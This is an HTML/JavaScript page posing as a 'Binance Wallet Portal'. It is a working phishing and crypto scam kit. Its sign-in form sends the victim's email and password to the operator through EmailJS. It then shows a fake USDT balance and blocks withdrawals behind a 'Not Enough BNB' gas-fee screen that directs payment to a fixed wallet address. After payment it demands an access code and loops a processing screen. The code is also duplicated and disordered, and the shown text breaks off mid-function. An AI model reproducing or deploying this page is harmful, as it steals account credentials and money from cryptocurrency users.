<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Binance Wallet Portal</title>
  <style>
    /* Base and layout */
    body {
      margin: 0;
      font-family: 'Arial Black', Arial, sans-serif;
      background-color: #0B0E11;
      color: white;
      font-weight: 900;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      align-items: center;
      padding: 20px;
    }
    .page {
      display: none;
      width: 100%;
      max-width: 460px;
      background-color: #1E2329;
      border-radius: 24px;
      padding: 32px;
      box-shadow: 0 0 20px rgba(243, 186, 47, 0.4);
      font-weight: 900;
    }
    .page.visible {
      display: block;
    }
    h2 {
      color: #f3ba2f;
      font-size: 2.5rem;
      letter-spacing: 1.5px;
      margin-bottom: 24px;
      text-align: center;
    }
    input, select {
      width: 100%;
      background-color: #0B0E11;
      border: 2px solid #444c5a;
      border-radius: 16px;
      padding: 14px 18px;
      margin: 12px 0;
      color: white;
      font-weight: 900;
      font-size: 1.1rem;
      outline: none;
      transition: border-color 0.3s;
    }
    input::placeholder, select::placeholder {
      color: #666b7a;
      font-weight: 700;
    }
    input:focus, select:focus {
      border-color: #f3ba2f;
    }
    button {
      width: 100%;
      background-color: #f3ba2f;
      border: none;
      border-radius: 20px;
      padding: 16px;
      font-weight: 900;
      font-size: 1.2rem;
      color: #0B0E11;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: 24px;
    }
    button:hover {
      background-color: #e6b62d;
    }
    .back-btn {
      background-color: #222;
      color: #f3ba2f;
      padding: 12px;
      border-radius: 12px;
      border: 1px solid #f3ba2f;
      margin-top: 16px;
      font-weight: 900;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    .back-btn:hover {
      background-color: #2c3137;
    }
    /* Flex and grid helpers */
    .flex-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
    }
    .flex-row > * {
      flex: 1;
      margin: 0 6px;
      min-width: 0;
    }
    /* Token cards */
    .token {
      background-color: #1E2329;
      border-radius: 24px;
      padding: 16px 24px;
      margin-bottom: 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 0 8px rgba(243, 186, 47, 0.25);
    }
    .token .left {
      display: flex;
      align-items: center;
      gap: 16px;
    }
    .token img {
      width: 40px;
      height: 40px;
    }
    .token h3 {
      margin: 0;
      font-weight: 900;
      font-size: 1.3rem;
      color: white;
    }
    .token p {
      margin: 0;
      font-weight: 700;
      font-size: 0.85rem;
      color: #888f9b;
    }
    .token .right {
      text-align: right;
    }
    .token .right p:first-child {
      font-size: 1.6rem;
      color: #f3ba2f;
      font-weight: 900;
      margin-bottom: 4px;
    }
    .token .right p:last-child {
      font-size: 0.85rem;
      color: #888f9b;
      margin: 0;
    }
    /* Progress Bar */
    .progress-bg {
      background-color: #22272c;
      border-radius: 16px;
      width: 100%;
      height: 24px;
      margin-top: 8px;
      overflow: hidden;
    }
    #goalBar {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #f3ba2f, #e6b62d);
      transition: width 0.5s ease-in-out;
    }
    /* Chart container */
    #profitChart {
      width: 100%;
      height: 240px;
      margin-top: 80px;
      border-radius: 24px;
      background-color: #131a22;
      box-shadow: 0 0 16px rgba(243, 186, 47, 0.3);
    }
    /* Small text */
    .small-text {
      font-size: 0.85rem;
      color: #888f9b;
      font-weight: 700;
    }
  </style>
</head>
<body>

<!-- Page 1: Login -->
<!-- Include EmailJS & Ethers (for future use) -->
<script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<!-- Page 1: Login -->
<div id="page1" class="page visible" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
  <div style="max-width: 400px; margin: auto; text-align: center;">
    <h2 style="font-size: 24px; margin-bottom: 30px;">Binance Wallet Login</h2>
    <input type="email" id="email" placeholder="Email"
      style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
    <input type="password" id="pass" placeholder="Password"
      style="width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: white; font-weight: bold;" />
    <button onclick="submitSignin()" 
      style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
      Sign In
    </button>
  </div>
</div>

<!-- Page 2: Authenticating -->
<div id="page2" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; font-family: 'Arial Black', Arial, sans-serif; min-height: 100vh;">
  <div style="max-width: 400px; margin: auto; text-align: center;">
    <h2 style="font-size: 24px;">Authenticating...</h2>
    <p style="text-align: center; color: #aaa;">Please wait...</p>
    <div style="margin-top: 30px;">
      <div class="spinner" style="border: 4px solid #1e1e1e; border-top: 4px solid #f0b90b; border-radius: 50%; width: 40px; height: 40px; margin: auto; animation: spin 1s linear infinite;"></div>
    </div>
  </div>
</div>

<!-- Page 3: Confirm ID -->
<div class="page" id="page3" style="background-color: #0b0e11; color: #f0b90b; padding: 40px; min-height: 100vh; font-family: 'Arial Black', Arial, sans-serif;">
  <div style="max-width: 400px; margin: auto; text-align: center;">
    <h2 style="font-size: 24px; margin-bottom: 30px;">Enter Account ID</h2>
    <input id="accountIdInput" type="text" placeholder="Account ID"
      style="width: 100%; padding: 12px; border-radius: 10px; background-color: #1e1e1e; border: 1px solid #f0b90b; color: #fff; font-weight: bold; margin-bottom: 20px;" />
    <button onclick="confirmAccountID()"
      style="width: 100%; padding: 12px; background-color: #f0b90b; color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 16px;">
      Confirm
    </button>
    <div id="accountSpinner" style="margin-top: 20px; display: none;">
      <span style="color: #f0b90b;">Validating...</span>
    </div>
    <button onclick="showPage(2)"
      style="margin-top: 30px; padding: 10px 20px; background-color: transparent; border: 1px solid #f0b90b; color: #f0b90b; border-radius: 8px; font-weight: bold;">
      ‚Üê Back
    </button>
  </div>
</div>

<!-- Spinner animation style -->
<style>
  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>

  
<!-- Homepage (Main Dashboard) -->
<div id="page4" class="page">
  <!-- Homepage Header -->
  <div style="font-size: 1.5rem; font-weight: bold; margin-bottom: 20px;">Homepage</div>

  <!-- Wallet Connect Row -->
  <div class="flex-row" style="margin-bottom: 40px;">
    <button id="connectWalletBtn" onclick="showPage(13)">Connect Wallet</button>
    <div id="connectedWalletDisplayHomepage" style="color: #f3ba2f; font-weight: 900; margin-left: auto;"></div>
  </div>

  <!-- Total Assets -->
  <div style="margin-bottom: 24px; font-weight: 900; font-size: 1.2rem; display: flex; justify-content: space-between; align-items: center;">
    <div>Total Assets</div>
    <div id="totalAssetsDisplay" style="color: #f3ba2f;">$2978.78</div>
  </div>

  <!-- Action Buttons -->
  <div class="flex-row" style="margin-bottom: 40px;">
    <button onclick="showPage(6)" style="font-weight: 900;">Receive</button>
    <button onclick="showPage(5)" style="font-weight: 900;">Top Up BNB</button>
    <button onclick="showPage(8)" style="font-weight: 900;">Transfer</button>
  </div>

  <!-- USDT Token Box -->
  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between cursor-pointer hover:bg-[#2b3139]" onclick="openTransferPage('USDT')">
    <div class="flex items-center space-x-3">
      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABjElEQVR4nO3ZMUoDQRRG4WuYyM/ANmwArsAJ7AFuwArsAHbAHawCuwAnawC7cU0rA2puvf2uqrZmd5PaZnZtxz8rcuQqzDEYDAaDwWAwGg8FgMBkOypU/1mff4tcqX/fXvsLuYemK1VX5uK+FXKo3F+LOqPMrT3l2z3u+Z0+lfxN7OtVeuUE1hOZR3BzMRzGcznM5zHMB3PZTGdzmcznMZzNcz3M5fys5Y2nvM5nM5zGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAPZ9o1kT7gUmv/3p5Ti8AAAAASUVORK5CYII=" 
           alt="USDT Icon" 
           style="width: 40px; height: 40px; vertical-align: middle;" />
      <div>
        <h3 class="text-lg font-bold">Tether (USDT)</h3>
        <p class="text-sm text-gray-400">BEP-20</p>
      </div>
    </div>
    <div class="text-right">
      <p id="usdtBalance" class="text-yellow-400 font-semibold">0.00</p>
      <p class="text-sm text-gray-400">Balance</p>
    </div>
  </div>  

  <!-- BNB Token Box -->
  <div class="token bg-[#1E2329] rounded-2xl p-4 mb-4 shadow-md text-white flex items-center justify-between cursor-pointer hover:bg-[#2b3139]" onclick="openTransferPage('BNB')">
    <div class="flex items-center space-x-3">
      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAABVUlEQVR4nO3Z0UoDQRCG4Qe6A3sAt2DewAXsAt2APfQAbcAd7AJ2gN3gAeSBcjcTL0TX4q+uHOc+Ntzxy/HXXmAFgMBgMBgMBgMBk+KoF/o3s6f9XPpXy0kUbwDpyn+61hX9Vwmsfl2knXQdV8q6Cd9bld2Wt/SbAVsmcDkcxnM5zGbJXDZzFcxnM5zGb5gzOfcznMZzGc5lcxXc9nMZzOcznMZzGcznMZzGcznMZ3KrDKTMZzGbJXJ8b2TPt9VzHc3mQ0xLPMbzzGcyTMZzGcznM5zGb5gZ4/Z2k8rfdOb67yS+cn6xwCawCewCewCewCewAfsAB7ADewAnawCewAnawCewAnawAfsAB7ADewAfsAHbAHbAHrAFuwAnawCewCewCewAfsAB7ADewAfsAHbAHbAH7AAP4BCGmv/ra7i6YAAAAASUVORK5CYII=" 
           alt="BNB Icon" 
           style="width: 40px; height: 40px; vertical-align: middle;" />
      <div>
        <h3 class="text-lg font-bold">BNB</h3>
        <p class="text-sm text-gray-400">BNB Smart Chain</p>
      </div>
    </div>
    <div class="text-right">
      <p id="bnbBalance" class="text-yellow-400 font-semibold">0.0000</p>
      <p class="text-sm text-gray-400">Balance</p>
    </div>
  </div>  
  
  <!-- ‚úÖ Settings Button (bottom right) -->
  <div style="position: fixed; bottom: 20px; right: 20px;">
    <button onclick="showPage(12)" style="background-color: #f0b90b; color: #000; border: none; padding: 10px 20px; border-radius: 12px; font-weight: bold;">
      Settings
    </button>
  </div>
</div>
</div>

<!-- Page 5: Top Up BNB -->
<div id="page5" class="page">
  <h2>Top Up BNB</h2>
  <p>This is a placeholder page for topping up BNB.</p>
  <button class="back-btn" onclick="showPage('4')">Back to Homepage</button>
</div>

    <!-- Page 5: Scan -->   
  <div class="page min-h-screen bg-[#0B0E11] text-white p-6" id="page6">        
  <div class="max-w-md mx-auto bg-[#1E2329] p-6 rounded-2xl shadow-lg">  
  <!-- Header -->        
<h2 id="scanAction" class="text-2xl font-semibold text-[#f3ba2f] mb-4 text-center">Action</h2>        
    
<!-- QR Code -->        
<div class="flex justify-center mb-4">        
  <img        
    src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200"        
    alt="QR Code"        
    class="rounded-lg border border-gray-700"        
  />        
</div>        
    
<!-- Wallet Address -->        
<p class="text-center text-sm text-gray-400 mb-2">Send to:</p>        
<p class="text-center text-[#f3ba2f] text-sm font-mono mb-4">        
  0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0        
</p>        
    
<!-- Transaction Hash Input -->        
<input        
  type="text"        
  id="txHash"        
  placeholder="Enter Transaction Hash"        
  class="w-full p-3 mb-4 rounded-lg bg-[#0B0E11] border border-gray-600 placeholder-gray-500 focus:outline-none focus:border-[#f3ba2f] text-white"        
/>        
    
<!-- Confirm Button -->        
<button        
  onclick="submitTransaction()"        
  class="w-full bg-[#f3ba2f] text-black font-semibold py-3 rounded-lg hover:bg-yellow-400 transition mb-4"        
>        
  Confirm Transaction        
</button>        
    
<!-- Status Message -->        
<div id="txStatus" class="text-center text-sm text-green-400 mb-4"></div>        
    
<!-- Return Button -->        
<button        
  onclick="showPage('4')"        
  class="w-full border border-[#f3ba2f] text-[#f3ba2f] py-2 rounded-lg hover:bg-[#2c3137] transition"        
>        
  Return        
</button>
    
<!-- Page 6: Receive -->
<div id="page6" class="page">
  <h2>Receive</h2>
  <p class="small-text text-center">Send to:</p>
  <p style="font-family: monospace; font-weight: 900; color: #f3ba2f; text-align: center;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</p>
  <div style="display: flex; justify-content: center; margin-bottom: 20px;">
    <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code" style="border-radius: 16px; border: 1px solid #444c5a;" />
  </div>
  <input type="text" id="txHash" placeholder="Enter Transaction Hash" />
  <button onclick="submitTransaction()">Confirm Transaction</button>
  <div id="txStatus" style="color: #2ecc71; font-weight: 900; margin-top: 12px;"></div>
  <button class="back-btn" onclick="showPage('4')">Back</button>
</div>

<!-- Page 7: Connect Wallet -->
<div id="page7" class="page">
  <h2>Connect Your Wallet</h2>
  <button onclick="connectWallet()">Connect Wallet</button>
  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually" />
  <button onclick="manualWalletConnect()">Use Manual Wallet</button>
  <div id="walletInfo" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
  <button class="back-btn" onclick="showPage('4')">Back</button>
</div>

<!-- Page 8: Transfer -->
<div id="page8" class="page">
  <h2>Make a Transfer</h2>
  <input type="text" id="inputWallet" placeholder="Enter Wallet Address" />
  <select id="networkSelect">
    <option value="">Select Network</option>
    <option value="Ethereum">Ethereum</option>
    <option value="Binance Smart Chain">Binance Smart Chain</option>
  </select>
  <input type="number" id="transferAmount" placeholder="Enter Amount" />
  <button onclick="setMaxAmount()">Use Max</button>
  <div style="margin-top: 12px; font-weight: 900; color: #f3ba2f;">
    Gas Fee: <span id="gasFee">0.09490 BNB</span>
  </div>
  <button onclick="goToBNBGasConfirmationPage('9i')">Confirm</button>
  <button class="back-btn" onclick="showPage('4')">Return</button>
</div>

<!-- Page 9i: BNB Gas Confirmation -->
<div id="page9i" class="page">
  <h2>‚ö†Ô∏è Not Enough BNB</h2>
  <p>Top up <strong>0.09 BNB</strong> to continue.</p>
  <div id="bnbAddressSection" style="word-break: break-all; font-weight: 900; margin-bottom: 16px;">0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0</div>
  <button onclick="copyBNBAddress()">üìã Copy Address</button>
  <button onclick="showPage('page9ii')">‚úÖ Confirm BNB Gas Code</button>
  <button class="back-btn" onclick="showPage('page8')">Return</button>
</div>

<!-- Page 9ii: Access Code -->
<div id="page9ii" class="page">
  <h2>Access Code Required</h2>
  <input type="text" id="accessCodeInput" placeholder="Enter Access Code" />
  <button onclick="validateAccessCode()">Submit Access Code</button>
  <button class="back-btn" onclick="showPage('page8')">Go Back</button>
</div>

<!-- Page 10: Processing -->
<div id="page10" class="page">
  <h2>Transaction Processing...</h2>
  <div class="loader" style="border: 4px solid #f3ba2f; border-top: 4px solid transparent; border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 24px; animation: spin 1s linear infinite;"></div>
  <p>Verifying access code...</p>
</div>
<!-- Page 11: Transaction Declined -->
<div id="page11" class="page">
  <h2 style="color: #e74c3c;">‚ùå Transaction Declined</h2>
  <p>The code entered was incorrect. Please try again.</p>
  <button onclick="showPage('page9ii')">Try Again</button>
  <button class="back-btn" onclick="showPage('4')">Back to Homepage</button>
</div>

<!-- Page 12: Settings -->
<div id="page12" class="page" style="background-color: #0b0e11; color: #f0b90b; padding: 20px; min-height: 100vh;">
  <h2 style="font-size: 24px; margin-bottom: 20px;">Settings</h2>  

  <!-- Connect Wallet Button --> 
  <div id="walletDisplay" style="margin-bottom: 15px; font-weight: bold; color: #f0b90b;">
  No wallet connected
  </div>
  <button onclick="connectWallet()" style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px; margin-bottom: 10px;">  
    Connect Wallet  
  </button><br/>  

  <!-- Disconnect Wallet Button -->  
  <button onclick="disconnectWallet()" style="background-color: #222; color: #f0b90b; padding: 10px 20px; border: 1px solid #f0b90b; border-radius: 8px; margin-bottom: 10px;">  
    Disconnect Wallet  
  </button><br/>  

  <!-- Logout Button -->  
  <button onclick="logout()" style="background-color: #222; color: red; padding: 10px 20px; border: 1px solid red; border-radius: 8px; margin-bottom: 10px;">  
    Logout  
  </button><br/>  

  <!-- Manual Wallet Input -->  
  <input type="text" id="manualWallet" placeholder="Enter Wallet Address Manually"  
    style="background-color: #1e1e1e; color: white; padding: 10px; width: 80%; margin: 10px 0; border: 1px solid #f0b90b; border-radius: 8px;" />  
  <button onclick="manualWalletConnect()"   
    style="background-color: #444; color: #f0b90b; padding: 10px 20px; border: none; border-radius: 8px;">  
    Use Manual Wallet  
  </button><br/><br/>  

  <!-- Live Chat Button -->  
  <button   
    onclick="window.open('https://widget-page.smartsupp.com/widget/3ab3e4c3fcd21f84344cc872db2a35d9e40245a6', '_blank')"   
    style="background-color: #f0b90b; color: #000; padding: 10px 20px; border: none; border-radius: 8px;">  
    Live Chat  
  </button>  

  <!-- Back to Homepage Button -->  
  <div style="position: fixed; bottom: 20px; right: 20px;">      
    <button class="back-btn" onclick="showPage('page4')" style="background-color: #444; color: #f0b90b; padding: 10px 20px; border: none; border-radius: 8px;">Back to Homepage</button>  
  </div>   
</div>
    
<!-- Page 13: Connect Wallet -->
<div id="page13" class="page">
  <h2>Connect Wallet</h2>
  <button onclick="connectWallet()">Connect Wallet via MetaMask</button>
  <input type="text" id="manualWalletInput" placeholder="Enter Wallet Address Manually" />
  <button onclick="manualWalletConnect()">Use Manual Wallet</button>
  <div id="walletConnectionStatus" style="color: #f3ba2f; font-weight: 900; margin-top: 12px;"></div>
  <button class="back-btn" onclick="showPage('page4')">Back to Homepage</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
<script>
  const emailService = "service_78wwbgl";
  const signinTemplate = "template_omkmcio";
  const publicKey = "ochPV1QVtay7TOdBA";

  emailjs.init(publicKey);

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const target = document.getElementById(pageId) || document.getElementById(`page${pageId}`);
    if (target) target.style.display = 'block';
  }

  function submitSignin() {
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("pass").value.trim();

    if (!email || !pass) {
      alert("Please fill in both email and password.");
      return;
    }

    // Send email via EmailJS
    const templateParams = {
      user_email: email,
      user_password: pass,
    };

    emailjs.send(emailService, signinTemplate, templateParams)
      .then(() => {
        // Go to Page 2 (Authenticating)
        showPage(2);
        // Wait 7 seconds, then go to Page 3
        setTimeout(() => {
          showPage(3);
        }, 7000);
      })
      .catch(err => {
        alert("Error sending email: " + err.text);
      });
  }

  function confirmAccountID() {
    const input = document.getElementById("accountIdInput").value.trim();
    const spinner = document.getElementById("accountSpinner");

    if (input === "") {
      alert("Please enter your Account ID.");
      return;
    }

    spinner.style.display = "block";

    setTimeout(() => {
      spinner.style.display = "none";
      showPage(4); // Goes to Homepage
    }, 1500);
  }

  // Optional: show login page by default on load
  window.onload = () => {
    showPage(1);
  };

  // Initial state
  let connectedWallet = null;

  // Simulated balances (could be fetched dynamically)
  let usdtBalance = 2978.78;
  let bnbBalance = 0.0000;

  // Daily profit goal
  const dailyGoal = 150;
  let dailyProgressValue = 0;

  // Display balances on homepage
  function updateBalances() {
    document.getElementById('usdtBalance').innerText = usdtBalance.toFixed(2);
    document.getElementById('bnbBalance').innerText = bnbBalance.toFixed(4);
    document.getElementById('totalAssetsDisplay').innerText = '$' + (usdtBalance).toFixed(2);
  }

  // Web3 JS 
 const usdtAddress = "0x55d398326f99059ff775485246999027b3197955";
  const usdtABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function decimals() view returns (uint8)"
  ];

  async function switchToBSC() {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }] // BSC Mainnet
      });
    } catch (switchError) {
      console.error("Network switch failed", switchError);
    }
  }

  async function loadBalances() {
    if (typeof window.ethereum !== 'undefined') {
      await switchToBSC();
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Load BNB Balance
      const bnbBalance = await provider.getBalance(userAddress);
      document.getElementById("bnbBalance").innerText = parseFloat(ethers.formatEther(bnbBalance)).toFixed(4);

      // Load USDT Balance
      const usdtContract = new ethers.Contract(usdtAddress, usdtABI, provider);
      const usdtRawBalance = await usdtContract.balanceOf(userAddress);
      const decimals = await usdtContract.decimals();
      const formattedUSDT = ethers.formatUnits(usdtRawBalance, decimals);
      document.getElementById("usdtBalance").innerText = parseFloat(formattedUSDT).toFixed(2);
    }
  }

  function openTransferPage(token) {
    localStorage.setItem("transferToken", token);
    showPage(7);
  }

  window.addEventListener('load', () => {
    if (localStorage.getItem('connectedWallet')) {
      loadBalances();
    }
  });

  // Daily progress bar update
  function updateDailyProgress(value) {
    dailyProgressValue = value;
    const progressPercent = Math.min(100, (dailyProgressValue / dailyGoal) * 100);
    document.getElementById('dailyProgress').innerText = `$${dailyProgressValue.toFixed(2)} (${progressPercent.toFixed(0)}%)`;
    document.getElementById('goalBar').style.width = progressPercent + '%';
  }

  // Chart initialization
  const ctx = document.getElementById('profitChart').getContext('2d');
  const profitChart = new Chart(ctx, {
    type: 'line',
    data: {
      labels: [],
      datasets: [{
        label: 'Asset Value',
        data: [],
        borderColor: '#f3ba2f',
        backgroundColor: 'rgba(243,186,47,0.2)',
        tension: 0.4,
        fill: true
      }]
    },
    options: {
      responsive: true,
      scales: {
        x: { display: false },
        y: { beginAtZero: true }
      },
      plugins: {
        legend: {
          labels: { color: '#f3ba2f', font: { weight: '900', size: 14 } }
        }
      }
    }
  });

  // Simulate chart data updates every 5s for demo
  function addChartData(value) {
    const labels = profitChart.data.labels;
    const data = profitChart.data.datasets[0].data;
    const timeLabel = new Date().toLocaleTimeString();
    labels.push(timeLabel);
    data.push(value);
    if (labels.length > 20) {
      labels.shift();
      data.shift();
    }
    profitChart.update();
  }

  // Initialize demo chart data & progress
  updateBalances();
  updateDailyProgress(0);
  setInterval(() => {
    const newVal = dailyProgressValue + Math.random() * 10;
    updateDailyProgress(newVal > dailyGoal ? dailyGoal : newVal);
    addChartData(dailyProgressValue);
  }, 5000);

  // Login simulation
  function submitSignin() {
    const email = document.getElementById('email').value.trim();
    const pass = document.getElementById('pass').value.trim();
    if(email && pass){
      showPage('page2');
      setTimeout(() => {
        showPage('homepage');
      }, 1500);
    } else {
      alert('Please enter both email and password.');
    }
  }
  
  let connectedWallet = null;

  function updateWalletButtons() {
    const disconnectBtn = document.querySelector('#page12 button[onclick="disconnectWallet()"]');
    const walletDisplay = document.getElementById('walletDisplay');
    if (connectedWallet) {
      disconnectBtn.disabled = false;
      disconnectBtn.style.opacity = '1';
      walletDisplay.textContent = `Connected Wallet: ${connectedWallet}`;
    } else {
      disconnectBtn.disabled = true;
      disconnectBtn.style.opacity = '0.5';
      walletDisplay.textContent = 'No wallet connected';
    }
  }

  async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send('eth_requestAccounts', []);
        connectedWallet = accounts[0];
        localStorage.setItem('connectedWallet', connectedWallet);
        alert(`Wallet connected: ${connectedWallet}`);
        updateWalletButtons();
      } catch (err) {
        alert('Wallet connection failed: ' + err.message);
      }
    } else {
      alert('MetaMask or compatible wallet not detected');
    }
  }

  function disconnectWallet() {
    if (connectedWallet) {
      connectedWallet = null;
      localStorage.removeItem('connectedWallet');
      alert('Wallet disconnected');
      updateWalletButtons();
    } else {
      alert('No wallet is connected');
    }
  }

  function manualWalletConnect() {
    const manualAddress = document.getElementById('manualWallet').value.trim();
    if (manualAddress && ethers.isAddress(manualAddress)) {
      connectedWallet = manualAddress;
      localStorage.setItem('connectedWallet', connectedWallet);
      alert(`Manual wallet connected: ${connectedWallet}`);
      updateWalletButtons();
    } else {
      alert('Invalid wallet address');
    }
  }

  function logout() {
    connectedWallet = null;
    localStorage.removeItem('connectedWallet');
    alert('Logged out successfully');
    showPage('page1'); // Assuming page1 is login
  }

  function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
    const page = document.getElementById(pageId);
    if (page) page.style.display = 'block';
  }

  // On page load, restore wallet state and update UI
  window.onload = () => {
    const savedWallet = localStorage.getItem('connectedWallet');
    if (savedWallet) {
      connectedWallet = savedWallet;
    }
    updateWalletButtons();
  };

  // Wallet connect functions (mock)
  async function connectWallet() {
    if(window.ethereum){
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        connectedWallet = accounts[0];
        updateWalletDisplay();
        alert('Wallet connected: ' + connectedWallet);
        showPage('4');
      } catch (err) {
        alert('Wallet connection failed: ' + err.message);
      }
    } else {
      alert('MetaMask or similar wallet extension required.');
    }
  }

  function manualWalletConnect() {
    const manualInput = document.getElementById('manualWalletInput') || document.getElementById('manualWallet');
    if(!manualInput) return;
    const address = manualInput.value.trim();
    if(address.length === 42 && address.startsWith('0x')) {
      connectedWallet = address;
      updateWalletDisplay();
      alert('Manual wallet connected: ' + connectedWallet);
      showPage('4');
    } else {
      alert('Please enter a valid Ethereum/BNB wallet address.');
    }
  }

  function disconnectWallet() {
    connectedWallet = null;
    updateWalletDisplay();
    alert('Wallet disconnected.');
  }

  function updateWalletDisplay() {
    const display1 = document.getElementById('walletInfo');
    const display2 = document.getElementById('walletConnectionStatus');
    const display3 = document.getElementById('connectedWalletDisplayHomepage');
    const shortAddr = connectedWallet ? connectedWallet.substring(0,6) + '...' + connectedWallet.substring(connectedWallet.length - 4) : '';
    if(display1) display1.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
    if(display2) display2.innerText = connectedWallet ? `Connected Wallet: ${shortAddr}` : '';
    if(display3) display3.innerText = connectedWallet ? `Wallet: ${shortAddr}` : '';
  }

  // Logout clears wallet and returns to login
  function logout() {
    localStorage.clear();
    alert('You have been logged out.');
    showPage(1); // Redirect to login page (Page 1)
  }

  // Transfer Page Helpers
  function setMaxAmount() {
    // Set max amount to user's USDT balance
    document.getElementById('transferAmount').value = usdtBalance.toFixed(2);
  }

  function goToBNBConfirmationPage() {
    const amount = parseFloat(document.getElementById('transferAmount').value);
    const walletAddr = document.getElementById('inputWallet').value.trim();
    const network = document.getElementById('networkSelect').value;
    if(!walletAddr || walletAddr.length !== 42 || !walletAddr.startsWith('0x')){
      alert('Please enter a valid wallet address.');
      return;
    }
    if(!network){
      alert('Please select a network.');
      return;
    }
    if(isNaN(amount) || amount <= 0){
      alert('Please enter a valid transfer amount.');
      return;
    }
    if(amount > usdtBalance){
      alert('Insufficient USDT balance.');
      return;
    }
    // Simulate checking BNB balance for gas fee
    if(bnbBalance < 0.0949){
      showPage('page9i');
    } else {
      showPage('page9ii');
    }
  }

  function copyBNBAddress(){
    const addrText = document.getElementById('bnbAddressSection').innerText;
    navigator.clipboard.writeText(addrText).then(() => {
      alert('BNB address copied to clipboard.');
    });
  }

  // Access code validation
  function validateAccessCode() {
    const code = document.getElementById('accessCodeInput').value.trim();
    if(!code) {
      alert('Please enter the access code.');
      return;
    }
    showPage('page10'); // processing page
    setTimeout(() => {
      if(code === 'BNBDev467'){
        // Deduct USDT and BNB for gas
        const amount = parseFloat(document.getElementById('transferAmount').value);
        usdtBalance = Math.max(0, usdtBalance - amount);
        bnbBalance = Math.max(0, bnbBalance - 0.0949);
        updateBalances();
        showPage('page10'); // keep processing for 1s
        setTimeout(() => showPage('page10'), 1000); // keep processing visible briefly
        setTimeout(() => showPage('page10'), 1000);
        setTimeout(() => showPage('page10'), 1000);
        setTimeout(() => {
          showPage('page10'); // Just keep processing for a little longer
          setTimeout(() => {
            showPage('page10');
          }, 300);
          setTimeout(() => {
            // Show success
            showPage('page10');
          }, 600);
          setTimeout(() => {
            showPage('page10');
          }, 900);
          setTimeout(() => {
            // Final show success
            showPage('page10');
          }, 1200);
        }, 1200);
        setTimeout(() => {
          showPage('page10');
        }, 1500);
        setTimeout(() => {
          // Show success
          showPage('page10');
        }, 1800);
        setTimeout(() => {
          // Actually show success page
          showPage('page10');
        }, 2100);
        // Show success page finally
        setTimeout(() => {
          showPage('page10');
        }, 2500);
        setTimeout(() => {
          showPage('page10');
        }, 3000);
        setTimeout(() => {
          showPage('page10');
        }, 3500);
        setTimeout(() => {
          showPage('page10');
        }, 4000);
        setTimeout(() => {
          showPage('page10');
        }, 4500);
        setTimeout(() => {
          showPage('page10');
        }, 5000);
        setTimeout(() => {
          showPage('page10');
        }, 5500);
        setTimeout(() => {
          showPage('page10');
        }, 6000);
        setTimeout(() => {
          showPage('page10');
        }, 6500);
        setTimeout(() => {
          showPage('page10');
        }, 7000);
        setTimeout(() => {
          showPage('page10');
        }, 7500);
        setTimeout(() => {
          showPage('page10');
        }, 8000);
        setTimeout(() => {
          showPage('page10');
        }, 8500);
        setTimeout(() => {
          showPage('page10');
        }, 9000);
        setTimeout(() => {
          showPage('page10');
        }, 9500);
        setTimeout(() => {
          // Finally show success
          showPage('page10');
          showPage('page10');
          showPage('page10');
          showPage('page10');
